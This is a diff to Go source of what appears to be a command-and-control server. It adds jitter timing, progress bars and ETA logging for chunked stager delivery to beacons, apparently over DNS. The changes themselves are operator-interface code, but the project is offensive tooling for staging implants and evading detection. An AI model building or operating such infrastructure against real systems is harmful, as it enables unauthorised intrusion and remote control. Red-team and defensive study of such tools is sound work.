@@ -90,6 +90,8 @@ type StagerSession struct {
 	TotalChunks  int
 	CreatedAt    time.Time
 	LastActivity time.Time // Updated on each chunk request to prevent premature expiration
+	StartedAt    time.Time // When first chunk was requested
+	LastChunk    *int      // Last chunk index sent (pointer to differentiate nil from 0)
 }
 
 // C2Manager handles beacon management and tasking
@@ -104,11 +106,12 @@ type C2Manager struct {
 	taskCounter     int
 	debug           bool
 	aesKey          []byte
+	jitterConfig    StagerJitter // Stager timing configuration
 }
 
 // NewC2Manager creates a new C2 management instance with the specified configuration.
 // It initializes the beacon tracking system, task management, and sets up AES encryption.
-func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
+func NewC2Manager(debug bool, encryptionKey string, jitterConfig StagerJitter) *C2Manager {
 	aesKey := generateAESKey(encryptionKey)
 
 	c2 := &C2Manager{
@@ -121,12 +124,123 @@ func NewC2Manager(debug bool, encryptionKey string) *C2Manager {
 		taskCounter:     taskCounterStart,
 		debug:           debug,
 		aesKey:          aesKey,
+		jitterConfig:    jitterConfig,
 	}
 
 	// Start cleanup goroutine
 	go c2.cleanupExpiredSessions()
 
 	return c2
+}
+
+// calculateStagerETA estimates time remaining for stager download based on jitter configuration
+// Returns a human-readable duration string (e.g., "2m 30s", "45s")
+func calculateStagerETA(chunksRemaining int, jitter StagerJitter) string {
+	if chunksRemaining <= 0 {
+		return "complete"
+	}
+
+	// Calculate average jitter delay per chunk
+	avgJitterMs := float64(jitter.JitterMinMs+jitter.JitterMaxMs) / 2.0
+
+	// Calculate number of burst pauses
+	burstCount := chunksRemaining / jitter.ChunksPerBurst
+
+	// Total estimated time in milliseconds
+	totalMs := (float64(chunksRemaining) * avgJitterMs) + (float64(burstCount) * float64(jitter.BurstPauseMs))
+
+	// Convert to duration
+	duration := time.Duration(totalMs) * time.Millisecond
+
+	// Format as human-readable string
+	if duration < time.Minute {
+		return fmt.Sprintf("%ds", int(duration.Seconds()))
+	} else if duration < time.Hour {
+		minutes := int(duration.Minutes())
+		seconds := int(duration.Seconds()) % 60
+		if seconds > 0 {
+			return fmt.Sprintf("%dm %ds", minutes, seconds)
+		}
+		return fmt.Sprintf("%dm", minutes)
+	} else {
+		hours := int(duration.Hours())
+		minutes := int(duration.Minutes()) % 60
+		return fmt.Sprintf("%dh %dm", hours, minutes)
+	}
+}
+
+// renderProgressBar creates a visual progress bar for stager downloads
+// Returns a formatted string with progress bar, percentage, and ETA
+//
+//nolint:unused // Used by logStagerProgress
+func renderProgressBar(current, total int, eta string, clientIP string) string {
+	if total == 0 {
+		return ""
+	}
+
+	percentage := float64(current) / float64(total) * 100
+	barWidth := 40
+	filled := int(float64(barWidth) * float64(current) / float64(total))
+
+	// Build progress bar
+	bar := "["
+	for i := 0; i < barWidth; i++ {
+		if i < filled {
+			bar += "="
+		} else if i == filled && filled < barWidth {
+			bar += ">"
+		} else {
+			bar += " "
+		}
+	}
+	bar += "]"
+
+	// Format: [=========>           ] 25% (10/40 chunks) ETA: 2m 30s - 192.168.1.100
+	return fmt.Sprintf("\r[Stager] %s %.1f%% (%d/%d chunks) ETA: %s - %s",
+		bar, percentage, current, total, eta, clientIP)
+}
+
+// logStagerProgress displays or updates the progress bar for stager downloads
+func (c2 *C2Manager) logStagerProgress(session *StagerSession, chunkIndex int, clientIP string) {
+	current := chunkIndex + 1
+	chunksRemaining := session.TotalChunks - current
+	eta := calculateStagerETA(chunksRemaining, c2.jitterConfig)
+
+	progressBar := renderProgressBar(current, session.TotalChunks, eta, clientIP)
+
+	// If this is the first chunk, print on new line
+	if chunkIndex == 0 {
+		fmt.Print("\n" + progressBar)
+	} else if current == session.TotalChunks {
+		// Final chunk - print with newline to complete the progress bar
+		elapsed := time.Since(session.StartedAt)
+		fmt.Printf("\r[Stager] %s %.1f%% (%d/%d chunks) Complete in %s - %s\n",
+			"[========================================]", 100.0, session.TotalChunks, session.TotalChunks,
+			formatDuration(elapsed), clientIP)
+	} else {
+		// Update in place (carriage return handled in renderProgressBar)
+		fmt.Print(progressBar)
+	}
+}
+
+// formatDuration formats a duration into human-readable format
+//
+//nolint:unused // Used by logStagerProgress
+func formatDuration(d time.Duration) string {
+	if d < time.Minute {
+		return fmt.Sprintf("%ds", int(d.Seconds()))
+	} else if d < time.Hour {
+		minutes := int(d.Minutes())
+		seconds := int(d.Seconds()) % 60
+		if seconds > 0 {
+			return fmt.Sprintf("%dm %ds", minutes, seconds)
+		}
+		return fmt.Sprintf("%dm", minutes)
+	} else {
+		hours := int(d.Hours())
+		minutes := int(d.Minutes()) % 60
+		return fmt.Sprintf("%dh %dm", hours, minutes)
+	}
 }
 
 // cleanupExpiredSessions periodically removes expired stager sessions and expected results
@@ -843,7 +957,8 @@ func (c2 *C2Manager) handleStagerRequest(parts []string, clientIP string, isDupl
 	}
 
 	if !isDuplicate {
-		logf("[C2] Split into %d chunks of %d bytes each", len(chunks), chunkSize)
+		logf("[C2] Stager deployment initiated: %s (%s/%s) - %d chunks (%d bytes each)",
+			stagerIP, stagerOS, stagerArch, len(chunks), chunkSize)
 	}
 
 	// Store session for this stager using the stager's actual IP (not DNS resolver IP)
@@ -892,6 +1007,11 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	// Update last activity timestamp to keep session alive during active downloads
 	session.LastActivity = time.Now()
 
+	// Initialize start time on first chunk
+	if chunkIndex == 0 && session.StartedAt.IsZero() {
+		session.StartedAt = time.Now()
+	}
+
 	// Validate chunk index
 	if chunkIndex < 0 || chunkIndex >= session.TotalChunks {
 		if !isDuplicate {
@@ -905,8 +1025,14 @@ func (c2 *C2Manager) handleStagerAck(parts []string, clientIP string, isDuplicat
 	chunk := session.Chunks[chunkIndex]
 
 	if !isDuplicate {
-		logf("[C2] Sending chunk %d/%d to %s (%d bytes)",
-			chunkIndex+1, session.TotalChunks, clientIP, len(chunk))
+		// Only update progress bar if this is a NEW chunk (different from last one)
+		if session.LastChunk == nil || *session.LastChunk != chunkIndex {
+			// Update last chunk sent
+			session.LastChunk = &chunkIndex
+
+			// Display progress bar instead of individual log lines
+			c2.logStagerProgress(session, chunkIndex, stagerIP)
+		}
 	}
 
 	// Return chunk (CHUNK responses are NOT base36 encoded - sent as plain text)
